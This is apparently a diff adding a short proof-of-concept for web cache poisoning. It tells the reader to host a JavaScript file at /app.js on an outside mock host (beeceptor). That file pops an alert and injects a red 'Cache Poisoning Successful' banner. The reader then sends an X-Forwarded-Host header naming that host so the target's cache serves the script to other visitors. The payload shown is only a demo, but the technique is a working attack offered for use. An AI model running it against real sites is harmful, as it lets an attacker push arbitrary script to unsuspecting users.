@@ -1,0 +1,19 @@
+upload this script on any host like beecebtor ,and edit config on beeceptor channge them conten-type to application/javascript
+and the pass make it called /app.js 
+
+
+alert("Poisoned app.js loaded\nyou got hacked");
+
+document.addEventListener("DOMContentLoaded", () => {
+    const banner = document.createElement("div");
+
+    banner.innerText = "⚠ Cache Poisoning Successful From untrusted beeceptor";
+    banner.style.padding = "10px";
+    banner.style.background = "red";
+    banner.style.color = "white";
+
+    document.body.prepend(banner);
+});
+____________________________________________________
+
+in req add X-Forwarded-Host:untrusted-cdn.free.beeceptor.com or your host
